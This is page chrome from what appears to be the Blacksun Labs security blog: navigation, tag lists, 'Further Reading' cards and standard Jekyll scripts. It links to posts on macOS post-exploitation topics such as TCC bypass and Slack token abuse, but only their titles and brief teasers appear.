rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink('', 'Link copied successfully!')" data-toggle="tooltip" data-placement="top" title="Copy link"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/Bypassing-TCC-With-iTerm2/">Bypassing TCC With iTerm2</a><li><a href="/posts/acquiring-and-abusing-legacy-slack-tokens/">Acquiring and Abusing Slack Legacy Tokens on macOS</a><li><a href="/posts/macOS-serial-console-login/">macOS Serial Console Login</a><li><a href="/posts/cultivating-an-online-persona-1/">Cultivating An Online Persona Part 1 - Bypassing Gmail's Phone Verification</a><li><a href="/posts/post-exploitation-persistence-with-application-shims-intro/">Post Exploitation Persistence With Application Shims (Intro)</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/macos/">MacOS</a> <a class="post-tag" href="/tags/post-exploitation/">Post-Exploitation</a> <a class="post-tag" href="/tags/persistence/">Persistence</a> <a class="post-tag" href="/tags/windows/">Windows</a> <a class="post-tag" href="/tags/exploitation/">exploitation</a> <a class="post-tag" href="/tags/fingerprinting/">Fingerprinting</a> <a class="post-tag" href="/tags/kernel/">kernel</a> <a class="post-tag" href="/tags/osint/">OSINT</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/chrome-arbitrary-javascript-injection-via-applescript/"><div class="card-body"> <span class="timeago small" >Dec 13, 2017<i class="unloaded">2017-12-13T00:00:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Chrome Arbitrary Javascript Injection Via AppleScript</h3><div class="text-muted small"><p> Foreword I’ve had a PoC for this technique for a little while as part of research for a future talk on the subject of post-exploitation in MacOS, but as an article has surfaced detailing the adware...</p></div></div></a></div><div class="card"> <a href="/posts/macOS-serial-console-login/"><div class="card-body"> <span class="timeago small" >Nov 18, 2018<i class="unloaded">2018-11-18T00:00:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>macOS Serial Console Login</h3><div class="text-muted small"><p> Foreword This short post documents a technique for authenticating as root on macOS and provides procedures for bypassing the default configuration of macOS which explicitly disables the root user. ...</p></div></div></a></div><div class="card"> <a href="/posts/iCloud-Authentication-Token-acquisition-on-macOS/"><div class="card-body"> <span class="timeago small" >Mar 13, 2019<i class="unloaded">2019-03-13T00:00:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>iCloud Authentication Token acquisition on macOS</h3><div class="text-muted small"><p> Foreward While this is by no means new or groundbreaking information I’ve been meaning to document a process known to the forensic and law enforcement community and provided as part of point-and-cl...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/Hijacking-Web-Traffic-MDM-Profiles/" class="btn btn-outline-primary" prompt="Older"><p>Hijacking Web Traffic On MacOS and iOS With MDM Profiles</p></a> <a href="/posts/Bypassing-TCC-With-iTerm2/" class="btn btn-outline-primary" prompt="Newer"><p>Bypassing TCC With iTerm2</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2022 <a href="https://twitter.com/BlacksunLabs_">Blacksun Labs</a>.</p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/macos/">MacOS</a> <a class="post-tag" href="/tags/post-exploitation/">Post Exploitation</a> <a class="post-tag" href="/tags/persistence/">Persistence</a> <a class="post-tag" href="/tags/windows/">Windows</a> <a class="post-tag" href="/tags/exploitation/">exploitation</a> <a class="post-tag" href="/tags/fingerprinting/">Fingerprinting</a> <a class="post-tag" href="/tags/kernel/">kernel</a> <a class="post-tag" href="/tags/osint/">OSINT</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://blacksunhackers.club{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.16.1,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id="></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', ''); }); </script>
